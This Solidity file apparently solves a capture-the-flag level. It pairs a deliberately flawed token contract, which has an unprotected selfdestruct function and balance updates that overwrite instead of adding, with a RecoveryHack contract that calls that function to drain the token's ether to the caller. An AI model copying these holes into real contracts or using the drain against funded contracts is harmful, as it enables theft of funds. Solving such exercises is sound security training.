// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract SimpleToken {

  using SafeMath for uint256;
  // public variables
  string public name;
  mapping (address => uint) public balances;

  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply) public {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  receive() external payable {
    balances[msg.sender] = msg.value.mul(10);
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public { 
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender].sub(_amount);
    balances[_to] = _amount;
  }

  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}

contract RecoveryHack {
    address payable me = /* your metamask address */;

    // You should have your token contract address by either calculating it in your browser or finding it on etherscan.
    // Pass it into this function to recover the 0.5 ether.
    function recover(address payable _tokenAddress) public {
        SimpleToken tokenContract = SimpleToken(_tokenAddress);
        tokenContract.destroy(me);
    }
}